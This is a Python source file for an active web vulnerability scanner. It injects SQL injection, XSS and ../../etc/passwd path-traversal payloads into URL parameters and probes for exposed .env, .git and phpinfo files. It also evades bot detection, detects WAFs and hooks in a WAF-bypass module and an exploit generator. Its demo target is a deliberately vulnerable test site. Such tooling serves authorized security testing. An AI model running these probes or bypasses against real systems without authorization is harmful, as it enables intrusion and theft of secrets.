#!/usr/bin/env python3
"""Active Vulnerability Scanner - Tests for real vulnerabilities
Context7 reviewed: requests library best practices applied
UPDATED: WAF/protection detection, proper error reporting, WAF bypass integration
"""

import requests
from requests.exceptions import RequestException, Timeout, ConnectionError
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import re
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Any, Tuple
import time
import warnings
from exploit_generator import ExploitGenerator

# Try to import WAF bypass module
try:
    from waf_bypass import WAFBypass
    WAF_BYPASS_AVAILABLE = True
except ImportError:
    WAF_BYPASS_AVAILABLE = False
    print("⚠️ WAF Bypass module not available - running without bypass features")

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class ActiveScanner:
    """Actively tests for vulnerabilities with proper error handling and browser emulation"""
    
    def __init__(self, enable_waf_bypass: bool = True):
        self.exploit_generator = ExploitGenerator()
        self.enable_waf_bypass = enable_waf_bypass and WAF_BYPASS_AVAILABLE
        
        # Initialize WAF bypass if available (silent initialization)
        if self.enable_waf_bypass:
            self.waf_bypass = WAFBypass()
        else:
            self.waf_bypass = None
        
        # Context7 recommendation: Use Session for connection pooling and cookie persistence
        self.session = self._create_robust_session()
        
        # Timeouts - Context7 pattern: separate connect and read
        self.connect_timeout = 5.0  # Connection timeout
        self.read_timeout = 10.0    # Read timeout
        
        # Rate limiting
        self.request_delay = 0.5  # Seconds between requests
        
        # WAF/Protection detection counters
        self.connection_reset_count = 0
        self.max_resets_before_waf_detection = 3  # Detect WAF after 3 consecutive resets
        
        # SQL injection payloads (REDUCED for speed)
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "1' AND 1=1--",
        ]
        
        # XSS payloads (REDUCED for speed)
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        
        # LFI/Path traversal payloads (REDUCED for speed)
        self.lfi_payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
        ]
        
        # Common vulnerable parameters
        self.test_params = ['id', 'cat', 'page', 'file', 'artist', 'pic', 'name', 'search', 'q', 'uname']
        
        # Common vulnerable paths to discover
        self.discovery_paths = [
            'artists.php',
            'listproducts.php',
            'artist.php',
            'categories.php',
            'product.php',
            'showimage.php',
            'cart.php',
            'login.php',
            'search.php',
            'admin/',
            'userinfo.php',
            'comment.php',
        ]
        
        # Info disclosure paths (REDUCED for speed)
        self.info_paths = [
            'phpinfo.php',
            '.git/HEAD',
            '.env',
        ]
        
        # WAF detection signatures - Context7: analyze response content
        self.waf_signatures = [
            'cloudflare',
            'incapsula',
            'imperva',
            'barracuda',
            'f5 networks',
            'fortinet',
            'sucuri',
            'akamai',
            'modsecurity',
            'wordfence',
            'access denied',
            'blocked',
            'security policy',
            'forbidden',
        ]
    
    def _create_robust_session(self) -> requests.Session:
        """
        Create a robust session with browser-like behavior
        Context7 best practices applied:
        - Session for connection pooling and cookie persistence
        - Retry with exponential backoff for reliability
        - HTTPAdapter for connection management
        - Browser-like headers to avoid bot detection
        - Context manager support for proper cleanup
        """
        session = requests.Session()
        
        # Context7: Configure automatic retries with exponential backoff
        retry_strategy = Retry(
            total=3,                           # 3 total retries
            backoff_factor=0.3,                # Wait 0.3, 0.9, 2.7 seconds
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST", "HEAD"],
        )
        
        # Context7: Mount adapter with retry strategy for connection pooling
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=10,               # Number of connection pools
            pool_maxsize=20                    # Max connections per pool
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Context7: Set browser-like headers for ALL requests to avoid bot detection
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        })
        
        # Context7: Disable SSL verification for pentesting
        # Note: SSL warnings already suppressed at module level
        session.verify = False
        
        return session
    
    def _detect_waf_from_response(self, response: requests.Response) -> Tuple[bool, str]:
        """
        Detect WAF/security protection from response
        Context7 pattern: analyze status code and response content
        Returns: (is_waf_detected, waf_type)
        """
        # Context7: Check status codes that indicate protection
        if response.status_code == 403:
            # Check response body for WAF signatures
            response_text_lower = response.text.lower()
            for signature in self.waf_signatures:
                if signature in response_text_lower:
                    return True, f"WAF Detected: {signature.title()}"
            return True, "WAF/Firewall: 403 Forbidden (Access Denied)"
        
        elif response.status_code == 401:
            return True, "Authentication Required: 401 Unauthorized"
        
        elif response.status_code == 429:
            return True, "Rate Limiting: 429 Too Many Requests"
        
        elif response.status_code in [406, 415]:
            return True, "Request Filtering: Content-Type or Accept Header Rejected"
        
        # Check response headers for WAF indicators
        headers_lower = {k.lower(): v.lower() for k, v in response.headers.items()}
        
        if 'server' in headers_lower:
            server = headers_lower['server']
            if any(waf in server for waf in ['cloudflare', 'cloudfront', 'akamai', 'imperva']):
                return True, f"WAF Detected: {server.title()}"
        
        if 'x-cdn' in headers_lower or 'cf-ray' in headers_lower:
            return True, "CDN/WAF: Cloudflare Detected"
        
        return False, ""
    
    def _make_request(self, url: str, method: str = 'GET', **kwargs) -> requests.Response:
        """
        Make HTTP request with proper timeout, error handling, and rate limiting
        Context7 best practices:
        - Use session for connection pooling and cookie management
        - Tuple timeouts for (connect, read) granularity
        - Specific exception handling for different error types
        - Allow redirects by default
        - Rate limiting to be respectful to servers
        """
        try:
            # Context7: Use tuple for (connect_timeout, read_timeout)
            timeout = kwargs.pop('timeout', (self.connect_timeout, self.read_timeout))
            
            # Context7: Allow redirects by default (can be overridden)
            allow_redirects = kwargs.pop('allow_redirects', True)
            
            # Rate limiting - be respectful to servers
            time.sleep(self.request_delay)
            
            # Context7: Use session for all requests
            # Session automatically handles cookies, connection pooling, and retries
            if method.upper() == 'GET':
                response = self.session.get(
                    url, 
                    timeout=timeout,
                    allow_redirects=allow_redirects,
                    **kwargs
                )
            elif method.upper() == 'POST':
                response = self.session.post(
                    url,
                    timeout=timeout,
                    allow_redirects=allow_redirects,
                    **kwargs
                )
            elif method.upper() == 'HEAD':
                response = self.session.head(
                    url,
                    timeout=timeout,
                    allow_redirects=allow_redirects,
                    **kwargs
                )
            else:
                raise ValueError(f"Unsupported method: {method}")
            
            # Reset connection reset counter on successful request
            self.connection_reset_count = 0
            
            return response
            
        except ConnectionError as e:
            # Context7: Handle specific connection errors
            # Detect connection resets that might indicate WAF/IPS
            error_str = str(e).lower()
            if 'remote end closed connection' in error_str or 'connection was forcibly closed' in error_str:
                self.connection_reset_count += 1
                print(f"[!] Connection reset detected ({self.connection_reset_count}/{self.max_resets_before_waf_detection})")
            else:
                print(f"[!] Connection error on {url}")
            raise
            
        except Timeout:
            # Context7: Handle timeout separately for better debugging
            print(f"[!] Timeout on {url}")
            raise
            
        except RequestException as e:
            # Context7: Catch all other request exceptions
            print(f"[!] Request error on {url}: {str(e)[:100]}")
            raise
    
    def test_connectivity(self, target: str) -> Tuple[bool, str, dict]:
        """
        Test if we can reach the target before scanning
        Returns: (is_accessible, message, protection_info)
        """
        protection_info = {
            'has_waf': False,
            'waf_type': '',
            'status_code': 0,
            'can_scan': True,
            'message': ''
        }
        
        try:
            print(f"[*] Testing connectivity to {target}")
            response = self._make_request(target, method='HEAD')
            
            # Context7: Check status code
            protection_info['status_code'] = response.status_code
            
            # Detect WAF/protection from response
            is_waf, waf_type = self._detect_waf_from_response(response)
            
            if is_waf:
                protection_info['has_waf'] = True
                protection_info['waf_type'] = waf_type
                protection_info['can_scan'] = False
                protection_info['message'] = f"Target protected: {waf_type}"
                print(f"[!] {waf_type}")
                return True, f"Protected: {waf_type}", protection_info
            
            # Context7: Check if status is acceptable for scanning
            if response.status_code < 400:
                protection_info['message'] = f"Target accessible (Status: {response.status_code})"
                print(f"[+] Target accessible (Status: {response.status_code})")
                return True, "Accessible", protection_info
            elif response.status_code < 500:
                protection_info['can_scan'] = False
                protection_info['message'] = f"Client error {response.status_code} - Cannot scan"
                print(f"[-] Target returned error {response.status_code}")
                return False, f"Client error {response.status_code}", protection_info
            else:
                protection_info['can_scan'] = False
                protection_info['message'] = f"Server error {response.status_code} - Cannot scan"
                print(f"[-] Target returned error {response.status_code}")
                return False, f"Server error {response.status_code}", protection_info
                
        except (Timeout, ConnectionError, RequestException) as e:
            protection_info['can_scan'] = False
            protection_info['message'] = f"Cannot establish connection: {str(e)[:100]}"
            print(f"[-] Cannot reach target: {str(e)[:100]}")
            return False, "Connection failed", protection_info
    
    def scan_target(self, target: str) -> Dict[str, Any]:
        """Run all active tests on target with WAF detection"""
        results = {
            'sql_injection': [],
            'xss': [],
            'lfi': [],
            'info_disclosure': [],
            'directory_listing': [],
            'protection_detected': [],
            'discovered_pages': []
        }
        
        print(f"[*] Starting active scan on {target}")
        
        # Discover pages first
        discovered_pages = self.discover_pages(target)
        results['discovered_pages'] = discovered_pages
        print(f"[+] Discovered {len(discovered_pages)} pages")
        
        # Test connectivity and detect protection
        is_accessible, message, protection_info = self.test_connectivity(target)
        
        # Add protection information to results
        if protection_info['has_waf'] or not protection_info['can_scan']:
            results['protection_detected'].append({
                'type': 'WAF/Security Protection',
                'details': protection_info['waf_type'] or protection_info['message'],
                'status_code': protection_info['status_code'],
                'can_scan': protection_info['can_scan'],
                'recommendation': 'Target is protected by WAF/firewall. Manual testing with proper authorization may be required.'
            })
            
            # If cannot scan, return early with protection info
            if not protection_info['can_scan']:
                print(f"[!] Scanning aborted: {protection_info['message']}")
                return results
        
        # Reset connection reset counter before scanning
        self.connection_reset_count = 0
        
        # Test SQL injection
        try:
            sql_vulns = self.test_sql_injection(target, results.get('discovered_pages'))
            results['sql_injection'] = sql_vulns
            
            # Check if WAF was detected during SQL testing
            if self.connection_reset_count >= self.max_resets_before_waf_detection:
                results['protection_detected'].append({
                    'type': 'WAF/IPS Detected',
                    'details': 'Multiple connection resets detected - WAF/IPS is blocking attack payloads',
                    'status_code': 0,
                    'can_scan': False,
                    'recommendation': 'Target has active WAF/IPS protection. Further testing may be blocked.'
                })
                print(f"[!] WAF/IPS detected - Aborting scan")
                return results
                
        except Exception as e:
            print(f"[!] SQL injection test failed: {e}")
        
        # Test XSS
        try:
            xss_vulns = self.test_xss(target)
            results['xss'] = xss_vulns
        except Exception as e:
            print(f"[!] XSS test failed: {e}")
        
        # Test LFI
        try:
            lfi_vulns = self.test_lfi(target)
            results['lfi'] = lfi_vulns
        except Exception as e:
            print(f"[!] LFI test failed: {e}")
        
        # Test info disclosure
        try:
            info_vulns = self.test_info_disclosure(target)
            results['info_disclosure'] = info_vulns
        except Exception as e:
            print(f"[!] Info disclosure test failed: {e}")
        
        return results
    
    def discover_pages(self, target: str) -> List[str]:
        """Discover pages on target site"""
        discovered = []
        
        for path in self.discovery_paths:
            test_url = urljoin(target, path)
            
            try:
                resp = self._make_request(test_url, method='HEAD')
                if resp.status_code == 200:
                    discovered.append(test_url)
                    print(f"[+] Found: {test_url}")
            except:
                continue
        
        return discovered
    
    def test_sql_injection(self, target: str, discovered_pages: List[str] = None) -> List[Dict]:
        """Test for SQL injection vulnerabilities with early WAF detection"""
        vulns = []
        
        # Use discovered pages if available
        test_urls = discovered_pages if discovered_pages else [target]
        
        # Common SQL error patterns
        sql_errors = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysql_",
            r"MySQLSyntaxErrorException",
            r"PostgreSQL.*?ERROR",
            r"SQLite.*?error",
            r"ORA-[0-9]+",
            r"Microsoft SQL Native Client error",
        ]
        
        for base_url in test_urls:
            for param in self.test_params:
                # Early WAF detection - stop if too many connection resets
                if self.connection_reset_count >= self.max_resets_before_waf_detection:
                    print(f"[!] Stopping SQL injection tests - WAF/IPS detected")
                    break
                
                for payload in self.sql_payloads[:3]:  # Test first 3 payloads
                    test_url = f"{base_url}?{param}={payload}"
                    
                    try:
                        resp = self._make_request(test_url)
                        
                        # Check for SQL errors
                        for pattern in sql_errors:
                            if re.search(pattern, resp.text, re.IGNORECASE):
                                vulns.append({
                                    'url': test_url,
                                    'param': param,
                                    'payload': payload,
                                    'evidence': 'SQL error message detected'
                                })
                                print(f"[!] SQL Injection found: {test_url}")
                                break
                        
                    except (Timeout, ConnectionError, RequestException):
                        continue
        
        return vulns
    
    def test_xss(self, target: str) -> List[Dict]:
        """Test for XSS vulnerabilities"""
        vulns = []
        
        for param in self.test_params:
            # Early WAF detection
            if self.connection_reset_count >= self.max_resets_before_waf_detection:
                print(f"[!] Stopping XSS tests - WAF/IPS detected")
                break
            
            for payload in self.xss_payloads[:2]:  # Test first 2 payloads
                test_url = f"{target}?{param}={payload}"
                
                try:
                    resp = self._make_request(test_url)
                    
                    # Check if payload reflected
                    if payload in resp.text:
                        vulns.append({
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        })
                        print(f"[!] XSS found: {test_url}")
                        break
                    
                except (Timeout, ConnectionError, RequestException):
                    continue
        
        return vulns
    
    def test_lfi(self, target: str) -> List[Dict]:
        """Test for Local File Inclusion"""
        vulns = []
        
        # Unix/Linux indicators
        lfi_indicators = [
            'root:x:0:0:',
            'bin:x:1:1:',
            '/bin/bash',
            'daemon:x:',
        ]
        
        for param in ['file', 'page', 'path']:
            # Early WAF detection
            if self.connection_reset_count >= self.max_resets_before_waf_detection:
                print(f"[!] Stopping LFI tests - WAF/IPS detected")
                break
            
            for payload in self.lfi_payloads[:3]:
                test_url = f"{target}?{param}={payload}"
                
                try:
                    resp = self._make_request(test_url)
                    
                    # Check for /etc/passwd content
                    for indicator in lfi_indicators:
                        if indicator in resp.text:
                            vulns.append({
                                'url': test_url,
                                'param': param,
                                'payload': payload,
                                'evidence': f'File content detected: {indicator}'
                            })
                            print(f"[!] LFI found: {test_url}")
                            break
                    
                except (Timeout, ConnectionError, RequestException):
                    continue
        
        return vulns
    
    def test_info_disclosure(self, target: str) -> List[Dict]:
        """Test for information disclosure"""
        vulns = []
        
        for path in self.info_paths:
            test_url = urljoin(target, path)
            
            try:
                resp = self._make_request(test_url)
                
                if resp.status_code == 200:
                    # Check for specific indicators
                    if 'phpinfo()' in resp.text or 'PHP Version' in resp.text:
                        vulns.append({
                            'url': test_url,
                            'type': 'phpinfo',
                            'evidence': 'phpinfo() page exposed'
                        })
                        print(f"[!] Info disclosure: {test_url}")
                    elif '.git' in path and 'ref:' in resp.text:
                        vulns.append({
                            'url': test_url,
                            'type': 'git',
                            'evidence': 'Git repository exposed'
                        })
                        print(f"[!] Git exposure: {test_url}")
                    elif any(x in resp.text for x in ['DB_PASSWORD', 'database', 'mysql']):
                        vulns.append({
                            'url': test_url,
                            'type': 'config',
                            'evidence': 'Configuration file exposed'
                        })
                        print(f"[!] Config exposure: {test_url}")
                
            except (Timeout, ConnectionError, RequestException):
                continue
        
        return vulns
    
    def format_results(self, results: Dict, include_exploits: bool = True) -> List[Dict]:
        """Format results for API response with protection detection"""
        formatted = []
        
        # Context7: Report protection/WAF detection first
        if results.get('protection_detected'):
            for protection in results['protection_detected']:
                formatted.append({
                    'type': protection['type'],
                    'severity': 'INFO',
                    'description': protection['details'],
                    'url': '',
                    'status_code': protection.get('status_code', 0),
                    'recommendation': protection['recommendation'],
                    'note': 'This is a security protection, not a vulnerability'
                })
        
        # Generate exploits if requested and vulnerabilities found
        exploits = []
        if include_exploits and (results['sql_injection'] or results['xss'] or results['lfi']):
            exploits = self.exploit_generator.generate_exploits_from_scan(results)
        
        # SQL Injection
        if results['sql_injection']:
            for i, vuln in enumerate(results['sql_injection']):
                vuln_dict = {
                    'type': 'SQL Injection (Active Test)',
                    'severity': 'CRITICAL',
                    'description': f"Parameter '{vuln['param']}' vulnerable to SQL injection",
                    'url': vuln['url'],
                    'payload': vuln['payload'],
                    'evidence': vuln['evidence'],
                    'cwe': 'CWE-89',
                    'owasp_2021': 'A03:2021-Injection',
                    'recommendation': 'Use parameterized queries and input validation'
                }
                
                # Add exploit if available
                if exploits:
                    matching_exploits = [e for e in exploits if e.vulnerability_type == 'SQL Injection']
                    if i < len(matching_exploits):
                        exploit = matching_exploits[i]
                        vuln_dict['exploit'] = {
                            'command': exploit.command,
                            'manual_steps': exploit.manual_steps,
                            'curl_example': exploit.curl_example,
                            'expected_output': exploit.expected_output
                        }
                
                formatted.append(vuln_dict)
        
        # XSS
        if results['xss']:
            for i, vuln in enumerate(results['xss']):
                vuln_dict = {
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'HIGH',
                    'description': f"Parameter '{vuln['param']}' vulnerable to XSS",
                    'url': vuln['url'],
                    'payload': vuln['payload'],
                    'evidence': vuln['evidence'],
                    'cwe': 'CWE-79',
                    'owasp_2021': 'A03:2021-Injection',
                    'recommendation': 'Sanitize user input and encode output'
                }
                
                # Add exploit if available
                if exploits:
                    matching_exploits = [e for e in exploits if 'XSS' in e.vulnerability_type]
                    if i < len(matching_exploits):
                        exploit = matching_exploits[i]
                        vuln_dict['exploit'] = {
                            'command': exploit.command,
                            'manual_steps': exploit.manual_steps,
                            'curl_example': exploit.curl_example,
                            'expected_output': exploit.expected_output
                        }
                
                formatted.append(vuln_dict)
        
        # LFI
        if results['lfi']:
            for i, vuln in enumerate(results['lfi']):
                vuln_dict = {
                    'type': 'Local File Inclusion (LFI)',
                    'severity': 'CRITICAL',
                    'description': f"Parameter '{vuln['param']}' allows file access",
                    'url': vuln['url'],
                    'payload': vuln['payload'],
                    'evidence': vuln['evidence'],
                    'cwe': 'CWE-22',
                    'owasp_2021': 'A01:2021-Broken Access Control',
                    'recommendation': 'Use whitelist for file paths and avoid user input in file operations'
                }
                
                # Add exploit if available
                if exploits:
                    matching_exploits = [e for e in exploits if 'LFI' in e.vulnerability_type]
                    if i < len(matching_exploits):
                        exploit = matching_exploits[i]
                        vuln_dict['exploit'] = {
                            'command': exploit.command,
                            'manual_steps': exploit.manual_steps,
                            'curl_example': exploit.curl_example,
                            'expected_output': exploit.expected_output
                        }
                
                formatted.append(vuln_dict)
        
        # Info Disclosure
        if results['info_disclosure']:
            for i, vuln in enumerate(results['info_disclosure']):
                vuln_dict = {
                    'type': f'Information Disclosure ({vuln["type"]})',
                    'severity': 'MEDIUM',
                    'description': f'Sensitive file exposed: {vuln["url"]}',
                    'url': vuln['url'],
                    'evidence': vuln['evidence'],
                    'cwe': 'CWE-200',
                    'owasp_2021': 'A05:2021-Security Misconfiguration',
                    'recommendation': 'Remove or restrict access to sensitive files'
                }
                
                # Add exploit if available
                if exploits:
                    matching_exploits = [e for e in exploits if 'Information Disclosure' in e.vulnerability_type]
                    if i < len(matching_exploits):
                        exploit = matching_exploits[i]
                        vuln_dict['exploit'] = {
                            'command': exploit.command,
                            'manual_steps': exploit.manual_steps,
                            'curl_example': exploit.curl_example,
                            'expected_output': exploit.expected_output
                        }
                
                formatted.append(vuln_dict)
        
        return formatted
    
    def __del__(self):
        """Context7: Properly close session to release connections"""
        if hasattr(self, 'session'):
            self.session.close()

if __name__ == '__main__':
    # Test
    scanner = ActiveScanner()
    results = scanner.scan_target('http://testphp.vulnweb.com')
    formatted = scanner.format_results(results)
    print(f"\n[+] Found {len(formatted)} vulnerabilities")
    for v in formatted:
        print(f"  - {v['type']}: {v['description']}")
